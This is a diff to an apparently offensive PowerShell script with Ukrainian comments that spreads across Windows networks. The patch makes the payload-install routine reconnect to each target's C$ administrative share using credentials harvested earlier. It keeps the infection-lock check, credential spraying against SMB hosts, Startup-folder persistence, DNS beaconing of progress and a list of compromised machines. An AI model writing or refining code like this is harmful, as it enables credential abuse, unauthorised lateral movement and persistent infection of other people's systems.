@@ -183,7 +183,23 @@ function Test-SmbCredential {
 # ── Скопіювати скрипти у Startup папку цільового хоста ───────────────────────
 
 function Install-StartupPayload {
-    param([string]$TargetIP)
+    param([string]$TargetIP, [string]$Username = "", [string]$Password = "")
+
+    # Reconnect SMB з кредами — сесія від Test-SmbCredential може протухнути
+    $share = "\\$TargetIP\C$"
+    net use $share /delete 2>$null | Out-Null
+    if ($Username -and $Password) {
+        $Domain = if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { $env:USERDOMAIN }
+        $r = net use $share /user:"$Domain\$Username" $Password 2>&1
+        if ($LASTEXITCODE -ne 0) {
+            $r = net use $share /user:$Username $Password 2>&1
+        }
+        if ($LASTEXITCODE -ne 0) {
+            Write-Log "Install-StartupPayload: SMB reconnect failed for $TargetIP" -Level "WARN"
+            return $false
+        }
+        Write-Log "Install-StartupPayload: SMB reconnected as $Username"
+    }
 
     # Перевірка wsu.lock — якщо є, машина вже заражена → пропустити
     $lock_path = "\\$TargetIP\C$\Windows\Temp\wsu.lock"
@@ -359,14 +375,18 @@ foreach ($target in $smb_targets) {
     Write-Log "--- Attempting target: $target ---"
     Invoke-DnsBeacon -Label "B6:TRY:$target"
 
-    $success = $false
+    $success       = $false
+    $valid_user    = ""
+    $valid_pass    = ""
 
     # Перебір зібраних credentials (тільки ті що мають пароль)
     foreach ($cred in $all_creds | Where-Object { $_.Password }) {
         if (Test-SmbCredential -TargetIP $target -Username $cred.Username -Password $cred.Password) {
             Write-Log "Valid credential for $target : $($cred.Username) (from $($cred.Source))"
             Invoke-DnsBeacon -Label "B6:AUTH:OK:$target"
-            $success = $true
+            $success    = $true
+            $valid_user = $cred.Username
+            $valid_pass = $cred.Password
             break
         }
     }
@@ -378,7 +398,7 @@ foreach ($target in $smb_targets) {
     }
 
     # ── Встановити payload у Startup ─────────────────────────────────────────
-    $installed = Install-StartupPayload -TargetIP $target
+    $installed = Install-StartupPayload -TargetIP $target -Username $valid_user -Password $valid_pass
 
     if ($installed) {
         $compromised += $target
